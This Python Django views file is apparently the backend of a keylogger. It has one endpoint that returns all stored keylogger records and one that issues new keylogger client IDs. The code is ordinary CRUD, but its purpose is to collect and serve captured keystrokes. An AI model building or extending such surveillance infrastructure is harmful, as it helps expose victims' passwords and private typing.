from django.shortcuts import render
from rest_framework.response import Response
from rest_framework.views import APIView
from django.views import View
from django.http import HttpResponse
from django.db import transaction

from .models import *
from .serializers import *


class GetDataWithTime(APIView):
    def get(self, request, format=None):
        serializer = KeyloggerDataSerializer(KeyloggerData.objects.all(), many=True)
        return Response(serializer.data)


class CreateId(APIView):
    @transaction.atomic
    def get(self, request):
        new = KeyloggerID()
        new.save()
        serializer = KeyloggerIDSerializer(new)
        return Response(serializer.data)